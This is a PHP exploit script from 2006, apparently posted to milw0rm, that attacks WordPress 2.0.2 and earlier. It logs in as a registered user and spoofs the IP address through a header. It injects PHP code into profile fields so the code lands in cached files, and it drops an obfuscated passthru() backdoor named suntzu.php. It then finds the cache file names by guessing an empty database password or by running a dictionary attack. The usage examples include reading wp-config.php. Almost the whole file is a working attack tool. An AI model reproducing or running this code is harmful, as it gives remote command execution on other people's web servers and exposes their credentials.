#!/usr/bin/php -q -d short_open_tag=on
<?
echo "--------------------------------------------------------------------\r\n";
echo "| WordPress <= 2.0.2 'cache' shell injection exploit               |\r\n";
echo "| by rgod rgod@autistici.org                                       |\r\n";
echo "| site: http://retrogod.altervista.org                             |\r\n";
echo "| dork: inurl:wp-login.php Register Username Password -echo        |\r\n";
echo "--------------------------------------------------------------------\r\n";

/*
this works:
regardless of all php.ini settings,
if user registration is enabled,
against an empty or weak MySQL DB password (read explaination for details...)
*/

if ($argc<6) {
echo "Usage: php ".$argv[0]." host path user pass cmd OPTIONS             \r\n";
echo "host:      target server (ip/hostname)                              \r\n";
echo "path:      path to WordPress                                        \r\n";
echo "cmd:       a shell command                                          \r\n";
echo "user/pass: you need a valid user account                            \r\n";
echo "Options:                                                            \r\n";
echo "   -D[dicrionary] specify a textfile and try dictionary attack      \r\n";
echo "   -p[port]:        \"  a port other than 80                        \r\n";
echo "   -P[ip:port]:     \"  a proxy                                     \r\n";
echo "Examples:                                                           \r\n";
echo "php ".$argv[0]." localhost /wordpress/ your_username password ls -la -Ddic.txt\r\n";
echo "php ".$argv[0]." localhost /wordpress/ your_username password cat ./../../../wp-config.php -p81\r\n";
echo "php ".$argv[0]." localhost / your_username password ls -la -P1.1.1.1:80\r\n\r\n";
die;
}

/* explaination:

  i) wordpress stores some user informations inside cached files
   in wp-content/cache/userlogins/ and wp-content/cache/users/ folders, they are
   php files.
   Normally they look like this:

   <?php
   //O:8:"stdClass":23:{s:2:"ID";s:3:"106";s:10:"user_login";s:6:"suntzu";s:9:"user_pass";s:32:"a2b0f31cd94e749b58307775462e2e4b";s:13:"user_nicename";s:6:"suntzu";s:10:"user_email";s:18:"suntzoi@suntzu.org";s:8:"user_url";s:0:"";s:15:"user_registered";s:19:"2006-05-24 23:00:42";s:19:"user_activation_key";s:0:"";s:11:"user_status";s:1:"0";s:12:"display_name";s:6:"suntzu";s:10:"first_name";s:0:"";s:9:"last_name";s:0:"";s:8:"nickname";s:6:"suntzu";s:11:"description";s:0:"";s:6:"jabber";s:0:"";s:3:"aim";s:0:"";s:3:"yim";s:0:"";s:15:"wp_capabilities";a:1:{s:10:"subscriber";b:1;}s:13:"wp_user_level";s:1:"0";s:10:"user_level";s:1:"0";s:14:"user_firstname";s:0:"";s:13:"user_lastname";s:0:"";s:16:"user_description";s:0:"";}
   ?>

   but...what happens if you inject a carriage return ( chr(13)...), some php code and some
   escape chars when you update your profile (ex. in "displayname" argument)?

   Look at this file now:

   <?php
   //O:8:"stdClass":24:{s:2:"ID";s:3:"106";s:10:"user_login";s:6:"suntzu";s:9:"user_pass";s:32:"a2b0f31cd94e749b58307775462e2e4b";s:13:"user_nicename";s:6:"suntzu";s:10:"user_email";s:17:"suntzu@suntzu.org";s:8:"user_url";s:7:"http://";s:15:"user_registered";s:19:"2006-05-24 23:00:42";s:19:"user_activation_key";s:0:"";s:11:"user_status";s:1:"0";s:12:"display_name";s:185:"suntzu
   error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){$_REQUEST[cmd]=stripslashes($_REQUEST[cmd]);}echo 56789;passthru($_REQUEST[cmd]);echo 56789;//suntzuuuuuuuuuuuuuu";s:10:"first_name";s:6:"suntzu";s:9:"last_name";s:6:"suntzu";s:8:"nickname";s:6:"suntzu";s:11:"description";s:6:"whoami";s:6:"jabber";s:0:"";s:3:"aim";s:0:"";s:3:"yim";s:0:"";s:15:"wp_capabilities";a:1:{s:10:"subscriber";b:1;}s:13:"wp_user_level";s:1:"0";s:10:"user_level";s:1:"0";s:12:"rich_editing";s:4:"true";s:14:"user_firstname";s:6:"suntzu";s:13:"user_lastname";s:6:"suntzu";s:16:"user_description";s:6:"whoami";}
   ?>

   you have a backdoor on target server...

   Now you have to search a way to guess filenames 'cause we have an
   index.php to trivially protect folders, but... guess what?

   give a look at wp-includes/cache.php at line 355:

   ...
   $cache_file = $group_dir.md5($id.DB_PASSWORD).'.php';
   ...

   $group_dir is the folder where files are stored
   DB_PASSWORD costant could be empty, if so...
   you have only to calculate the md5 hash of your user id, then:

   http://[target]/[path]/wp-content/cache/users/[md5(user_id)].php?cmd=ls%20-la

   the same with userlogins/ folder, this time:

   http://[target]/[path]/wp-content/cache/userlogins/[md5(username)].php?cmd=ls%20-la

   otherwise you can check if DB_PASSWORD is in a dictionary through the -D option,
   this tool calculate the hash to do something like this:

   http://[target]/[path]/wp-content/cache/users/[md5([user_id][db_pass])].php?cmd=ls%20-la
   http://[target]/[path]/wp-content/cache/userloginss/[md5([username][db_pass])].php?cmd=ls%20-la

  ii) an ip-spoofing issue in vars.php:

  ...
  // On OS X Server, $_SERVER['REMOTE_ADDR'] is the server's address. Workaround this
  // by using $_SERVER['HTTP_PC_REMOTE_ADDR'], which *is* the remote address.
  if ( isset($_SERVER['HTTP_PC_REMOTE_ADDR']) )
  	$_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_PC_REMOTE_ADDR'];
  ...

  poc:
  you can set an http header like this when you register:

  PC_REMOTE_ADDR: 1.1.1.1
									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;

}
$host=$argv[1];
$path=$argv[2];
$username=$argv[3];
$password=$argv[4];
$cmd="";
$port=80;
$proxy="";
$dict="";

for ($i=5; $i<=$argc-1; $i++){
$t=$argv[$i][0].$argv[$i][1];
if (($t<>"-p") and ($t<>"-P") and ($t<>"-D"))
{$cmd.=" ".$argv[$i];}
if ($t=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($t=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($t=="-D")
{
  $dict=str_replace("-D","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "step 0 -> check if suntzu.php is already installed...\r\n";
$check=array("users/suntzu.php",
	     "userlogins/suntzu.php"
	     );
for ($i=0; $i<=count($check)-1; $i++)
{
  $packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Cookie: cmd=".$cmd."\r\n";
  $packet.="Connection: close\r\n\r\n";
  sendpacketii($packet);
  if (strstr($html,"*DL*"))
  {
    echo "Exploit succeeded...\r\n";$temp=explode("*DL*",$html);echo $temp[1]."\r\n";echo"Now you can launch commands through the followig url:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la";die;
  }
}
echo "step 1 -> Login ...\r\n";
$data="log=".urlencode(trim($username));
$data.="&pwd=".urlencode(trim($password));
$data.="&rememberme=forever";
$data.="&submit=".urlencode("Login &raquo;");
$data.="&redirect_to=wp-admin";
$packet="POST ".$p."wp-login.php HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n"; //ip spoofing bug in vars.php ;)...
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$temp2=explode(" ",$temp[1]);
$cookie=$temp2[0];
$temp2=explode(" ",$temp[2]);
$cookie.=" ".$temp2[0];
if ($cookie==''){echo "Unable to login...";die;}
else {echo "cookie ->".$cookie."\r\n";}

echo "step 2 -> Retrieve your user id...\r\n";
$packet="GET ".$p."wp-admin/profile.php HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("checkuser_id\" value=\"",$html);
$temp2=explode("\"",$temp[1]);
$user_id=$temp2[0];
if ($user_id==''){die("Unable to retrieve user id...\r\n");}
else {echo "user id -> ".$user_id."\r\n";}

echo "step 3 -> Update your profile with the evil code...\r\n";
$suntzu='$fp=fopen("suntzu.php","w");fputs($fp,chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(114).chr(114).chr(111).chr(114).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(105).chr(110).chr(103).chr(40).chr(48).chr(41).chr(59).chr(115).chr(101).chr(116).chr(95).chr(116).chr(105).chr(109).chr(101).chr(95).chr(108).chr(105).chr(109).chr(105).chr(116).chr(40).chr(48).chr(41).chr(59).chr(105).chr(102).chr(32).chr(40).chr(103).chr(101).chr(116).chr(95).chr(109).chr(97).chr(103).chr(105).chr(99).chr(95).chr(113).chr(117).chr(111).chr(116).chr(101).chr(115).chr(95).chr(103).chr(112).chr(99).chr(40).chr(41).chr(41).chr(123).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(61).chr(115).chr(116).chr(114).chr(105).chr(112).chr(115).chr(108).chr(97).chr(115).chr(104).chr(101).chr(115).chr(40).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(59).chr(125).chr(101).chr(99).chr(104).chr(111).chr(32).chr(34).chr(42).chr(68).chr(76).chr(42).chr(34).chr(59).chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117).chr(40).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(59).chr(63).chr(62));fclose($fp);//';
$suntzu=urlencode($suntzu);
$code='error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){$_REQUEST[cmd]=stripslashes($_REQUEST[cmd]);}echo chr(42).chr(68).chr(76).chr(42);passthru($_REQUEST[cmd]);echo chr(42).chr(68).chr(76).chr(42);';
$code=urlencode($code);
$data="from=profile";
$data.="&checkuser_id=".$user_id;
$data.="&user_login=".urlencode(trim($username));
$data.="&first_name=".urlencode(trim($username));
$data.="&last_name=".urlencode(trim($username)).chr(13).$suntzu."//suntzuuu";
$data.="&nickname=".urlencode(trim($username));
$data.="&display_name=".urlencode(trim($username)).chr(13).$code."//suntzuu";
$data.="&email=".urlencode("suntzu@suntzu.org");
$data.="&url=".urlencode("http://");
$data.="&aim=";
$data.="&yim=";
$data.="&jabber=";
$data.="&description=whoami";
$data.="&rich_editing=true";
$data.="&submit=".urlencode("Update Profile &raquo;");
$packet="POST ".$p."wp-admin/profile-update.php HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Referer: http://".$host.$path."wp-admin/profile-update.php\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (eregi("updated=true",$html)){echo "Done...\r\n";}
else {die("Unable to update profile...");}

echo "step 4 -> go to profile page to avoid cached files deletion...\r\n";
$packet="GET ".$p."wp-admin/profile.php?updated=true HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacketii($packet);
if (eregi("200 OK",$html)){echo "Done...\r\n";}
sleep(2);

echo "step 5 -> check for an empty db password...\r\n";
$check=array("users/".md5($user_id).".php",
	     "userlogins/".md5(trim($username)).".php"
	     );
for ($i=0; $i<=count($check)-1; $i++)
{
  $packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Cookie: cmd=".$cmd."\r\n";
  $packet.="Connection: close\r\n\r\n";
  sendpacketii($packet);
  if (eregi("*DL*",$html))
  {
    echo "Exploit succeeded...\r\n";$temp=explode("*DL*",$html);echo($temp[1]);echo"\r\nNow you can launch commands through the followig urls:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la\r\nalso, you should have a backdoor called suntzu.php in the same folder\r\n";die;
  }
}

if ($dict=='') {echo "exploit failed...\r\n";}
else
   {
    echo "step 6 -> trying with dictionary attack...\r\n";
    if (file_exists($dict))
    {
      $fp=fopen($dict,"r");
      while (!feof($fp))
      {
        $word=trim(fgets($fp));
        $check=array("users/".md5($user_id.$word).".php",
	             "userlogins/".md5(trim($username).$word).".php"
	            );
        for ($i=0; $i<=count($check)-1; $i++)
        {
	  echo "Trying with ".$check[$i]."\r\n";
          $packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Cookie: cmd=".$cmd."\r\n";
          $packet.="Connection: close\r\n\r\n";
          sendpacketii($packet);
          if (strstr($html,"*DL*"))
          {
            echo "Exploit succeeded...\r\n";fclose($fp);$temp=explode("*DL*",$html);echo $temp[1];echo"Now you can launch commands through the followig url:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la\r\nalso, you should have a backdoor called suntzu.php in the same folder\r\n";
	    die;
          }
        }
     }
     fclose($fp);
     //if you are here...
     echo "Exploit failed...\r\n";
   }
   else
   {
     die($dict."does not exist!");
   }
  }
?>

# milw0rm.com [2006-05-25]